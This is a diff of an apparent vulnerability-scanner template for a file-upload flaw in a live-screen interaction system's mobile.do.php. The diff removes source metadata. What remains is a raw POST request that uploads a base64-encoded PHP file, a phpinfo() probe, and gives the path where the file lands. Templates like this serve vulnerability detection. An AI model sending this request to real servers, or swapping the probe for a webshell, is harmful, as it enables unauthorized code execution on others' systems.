@@ -3,12 +3,8 @@ info:
   name: 金华迪加网络科技有限公司现场大屏互动系统mobile.do.php存在文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wgf473qz2vep3pi7'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wgf473qz2vep3pi7
-    fofa: body="/wall/themes/meepo/assets/images/defaultbg.jpg"
 http:
 - raw:
   - 'POST /mobile/mobile.do.php?action=msg_uploadimg HTTP/1.1
@@ -56,7 +52,6 @@ http:
 
     filetype=php&imgbase64=PD9waHAgcGhwaW5mbygpOw%3D%3D
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077447234-407f7636-791f-430d-a9e6-56dcf8217282.png)
 
     上传定位：data//pic//pic_172973993847989.php'
   redirects: false
